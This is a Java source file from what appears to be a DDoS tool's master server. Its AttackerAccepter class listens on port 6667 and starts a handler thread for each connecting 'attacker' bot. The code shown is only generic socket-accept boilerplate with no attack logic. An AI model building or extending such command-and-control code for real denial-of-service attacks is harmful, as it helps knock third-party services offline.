/*
 * To change this template, choose Tools | Templates
 * and open the template in the editor.
 */
package ddos.server;

import java.io.IOException;
import java.net.ServerSocket;
import java.net.Socket;
import java.util.ArrayList;
import java.util.logging.Level;
import java.util.logging.Logger;

/**
 *
 * @author bruno
 */
public class AttackerAccepter implements Runnable {
    
    
     private ArrayList<AttackerListener> attackers;
     private Master m;
     private ServerSocket srv;
    
    AttackerAccepter(Master m) {
        this.attackers = new ArrayList<AttackerListener>();
        this.m = m;
    }

    @Override
    public void run() {
        System.out.println("AttackerAccepter - THREAD - START");
        
        try {
            this.srv = new ServerSocket(6667);
            
            while (!this.srv.isClosed()) {
                Socket s = srv.accept();
                System.out.println("new attacker");
                AttackerListener al = new AttackerListener(this.m, s);
                this.attackers.add(al);
               new Thread(al).start();
            }

            srv.close();

        } catch (Exception ex) {
            if (!this.m.isClosing())
                Logger.getLogger(Master.class.getName()).log(Level.SEVERE, null, ex);
        } finally {
           System.out.println("AttackerAccepter - THREAD - END");
       }
    }
    
    public void close() throws IOException {
        this.srv.close();
    }
    
}
